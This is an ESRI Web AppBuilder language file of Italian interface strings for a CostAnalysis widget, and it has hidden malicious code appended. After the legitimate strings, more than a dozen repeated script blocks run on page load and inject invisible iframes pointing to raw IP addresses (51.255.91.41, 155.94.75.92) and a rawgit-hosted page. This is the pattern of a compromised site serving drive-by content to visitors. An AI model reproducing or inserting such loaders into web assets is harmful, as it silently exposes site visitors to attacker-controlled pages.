// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Imposta testo config.:",generalSettings:{tabTitle:"Impostazioni generali",measurementUnitLabel:"Unit\u00e0 di misura",currencyLabel:"Simbolo di misurazione",roundCostLabel:"Costo arrotondato",projectOutputSettings:"Impostazioni output progetto",typeOfProjectAreaLabel:"Tipo di area di progetto",bufferDistanceLabel:"Distanza di buffer",roundCostValues:{twoDecimalPoint:"Due punti decimali",nearestWholeNumber:"Numero intero pi\u00f9 prossimo",
nearestTen:"Decimo pi\u00f9 prossimo",nearestHundred:"Centinaio pi\u00f9 prossimo",nearestThousand:"Migliaio pi\u00f9 prossimo",nearestTenThousands:"Decina di migliaia pi\u00f9 prossime"},projectAreaType:{outline:"Outline",buffer:"Buffer"},errorMessages:{currency:"Unit\u00e0 valuta non valida",bufferDistance:"Distanza di buffer non valida",outOfRangebufferDistance:"Il valore deve essere superiore a 0 e inferiore o uguale a 100"}},projectSettings:{tabTitle:"Impostazioni di progetto",costingGeometrySectionTitle:"Definisci geografia per costo (opzionale)",
costingGeometrySectionNote:"Nota: la configurazione di questo layer consentir\u00e0 all'utente di impostare equazioni di costo di modelli di feature basati su aree geografiche.",projectTableSectionTitle:"Possibilit\u00e0 di salvare/caricare le impostazioni di progetto (opzionali)",projectTableSectionNote:"Nota: la configurazione di tutti i layer e le tabelle consentir\u00e0 all\u2019utente di salvare/caricare il progetto per un uso successivo.",costingGeometryLayerLabel:"Costing Geometry Layer",fieldLabelGeography:"Campo da etichettare Geografia",
projectAssetsTableLabel:"Tabella risorse del progetto",projectMultiplierTableLabel:"Tabella costi aggiuntivi moltiplicatore progetto",projectLayerLabel:"Project Layer",configureFieldsLabel:"Configure Fields",fieldDescriptionHeaderTitle:"Descrizione Campo",layerFieldsHeaderTitle:"Layer Field",selectLabel:"Seleziona",errorMessages:{duplicateLayerSelection:"${layerName} \u00e8 gi\u00e0 stato selezionato",invalidConfiguration:"Selezionare ${fieldsString}"},costingGeometryHelp:'\x3cp\x3eSaranno mostrati layer poligonali con le seguenti condizioni verranno mostrati: \x3cbr/\x3e \x3cli\x3e Il layer deve avere la capacit\u00e0 "Query" \x3c/li\x3e \x3cli\x3e Il layer deve avere un campo GlobalID \x3c/li\x3e \x3c/p\x3e',
fieldToLabelGeographyHelp:"\x3cp\x3eI campi stringa e numerici del \u00e2\u20ac\u0153Costing Geometry Layer\u00e2\u20ac saranno mostrati nell\u2019elenco a discesa \u00e2\u20ac\u0153Campo da etichettare Geografia\u00e2\u20ac.\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3eSaranno mostrate le tabelle con le seguenti condizioni: \x3cbr/\x3e \x3cli\x3eLa tabella deve avere funzionalit\u00e0 di modifica ovvero \u00e2\u20ac\u0153Crea\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Elimina\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Aggiorna\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLa tabella deve avere sei campi con il nome e il tipo di dati esatti:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (campo tipo GUID)\x3c/li\x3e\x3cli\x3e\tCostEquation (campo tipo stringa)\x3c/li\x3e\x3cli\x3e\tScenario (campo tipo stringa)\x3c/li\x3e\x3cli\x3e\tTemplateName (campo tipo stringa)\x3c/li\x3e\x3cli\x3e    GeographyGUID (campo tipo GUID)\x3c/li\x3e\x3cli\x3e\tProjectGUID (campo tipo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eSaranno mostrate le tabelle con le seguenti condizioni: \x3cbr/\x3e \x3cli\x3eLa tabella deve avere funzionalit\u00e0 di modifica ovvero \u00e2\u20ac\u0153Crea\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Elimina\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Aggiorna\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLa tabella deve avere cinque campi con il nome e il tipo di dati esatti:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescrizione (campo tipo stringa)\x3c/li\x3e\x3cli\x3e\tTipo (campo tipo stringa)\x3c/li\x3e\x3cli\x3e\tValore (campo tipo Float/Doppio)\x3c/li\x3e\x3cli\x3e\tCostindex (campo tipo intero)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (campo tipo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eSaranno mostrati i layer poligonali con le seguenti condizioni: \x3cbr/\x3e \x3cli\x3eIl layer deve avere funzionalit\u00e0 di modifica ovvero \u00e2\u20ac\u0153Crea\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Elimina\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Aggiorna\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eIl layer deve avere cinque campi con il nome e il tipo di dati esatti:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (campo tipo stringa)\x3c/li\x3e\x3cli\x3eDescrizione (campo tipo stringa)\x3c/li\x3e\x3cli\x3eTotalassetcost (campo tipo Float/Doppio)\x3c/li\x3e\x3cli\x3eGrossprojectcost (campo tipo Float/Doppio)\x3c/li\x3e\x3cli\x3eGlobalID (campo tipo GlobalID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Impostazioni layer",layerNameHeaderTitle:"Nome layer",layerNameHeaderTooltip:"Elenco di layer nella mappa",EditableLayerHeaderTitle:"Modificabile",EditableLayerHeaderTooltip:"Includere layer e modelli nel costing widget",SelectableLayerHeaderTitle:"Selezionabile",SelectableLayerHeaderTooltip:"La geometria derivata da una feature pu\u00f2 essere utilizzata per generare una nuova voce di costo",fieldPickerHeaderTitle:"ID progetto (opzionale)",fieldPickerHeaderTooltip:"Campo opzionale (di stringa tipo) per memorizzare l\u2019ID progetto in",
selectLabel:"Seleziona",noAssetLayersAvailable:"Nessun elemento del layer trovato nella webmap selezionata",disableEditableCheckboxTooltip:"Questo layer non ha funzionalit\u00e0 di modifica"},costingInfo:{tabTitle:"Info sui costi",proposedMainsLabel:"Linea principale proposta",addCostingTemplateLabel:"Aggiungi modello di costi",manageScenariosTitle:"Gestisci scenari",featureTemplateTitle:"Modello di feature",costEquationTitle:"Equazione di costi",geographyTitle:"Geografia",scenarioTitle:"Scenario",
actionTitle:"Azioni",scenarioNameLabel:"Nome scenario",addBtnLabel:"Aggiungi",srNoLabel:"No.",deleteLabel:"Elimina",duplicateScenarioName:"Duplica nome scenario",hintText:"\x3cdiv\x3eSuggerimento: utilizzare le seguenti parole chiave\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: utilizza il numero totale di risorse dello stesso tipo in una geografia\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: utilizza la lunghezza per gli elementi lineari  e l\u2019area gli elementi poligonali\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: utilizza la lunghezza totale per gli elementi lineari  e l\u2019area totale per gli ellementi poligonali dello stesso tipo in una geografia\x3c/li\x3e\x3c/ul\x3e\u00c8 possibile utilizzare le funzioni come:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eModificare l'equazione di costi in base alle necessit\u00e0 di progetto.",
noneValue:"None",requiredCostEquation:"Equazione di costi non valida per ${layerName} : ${templateName}",duplicateTemplateMessage:"Esiste una elemento del modello duplicato per $ {layerName}: $ {templateName}",defaultEquationRequired:"\u00c8 richiesta un\u2019equazione predefinita per ${layerName} : ${templateName}",validCostEquationMessage:"Immettere un\u2019equazione di costi valida",costEquationHelpText:"Modificare l\u2019equazione di costi in base alla necessit\u00e0 di progetto",scenarioHelpText:"Selezionare lo scenario in base alla necessit\u00e0 del progetto",
copyRowTitle:"Copia riga",noTemplateAvailable:"Aggiungere almeno un modello per ${layerName}",manageScenarioLabel:"Gestisci scenario",noLayerMessage:"Immettere almeno un layer in ${tabName}",noEditableLayersAvailable:"I layer devono essere selezionati come editabili nella scheda impostazioni layer"},statisticsSettings:{tabTitle:"Impostazioni statistiche",addStatisticsLabel:"Aggiungi statistiche",fieldNameTitle:"Campo",statisticsTitle:"Etichetta",addNewStatisticsText:"Aggiungi nuove statistiche",deleteStatisticsText:"Elimina statistiche",
moveStatisticsUpText:"Sposta statistiche in alto",moveStatisticsDownText:"Sposta statistiche in basso",selectDeselectAllTitle:"Seleziona tutto"},statisticsType:{countLabel:"Conteggio",averageLabel:"Media",maxLabel:"Massimo",minLabel:"Minimo",summationLabel:"Somma",areaLabel:"Area",lengthLabel:"Lunghezza"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});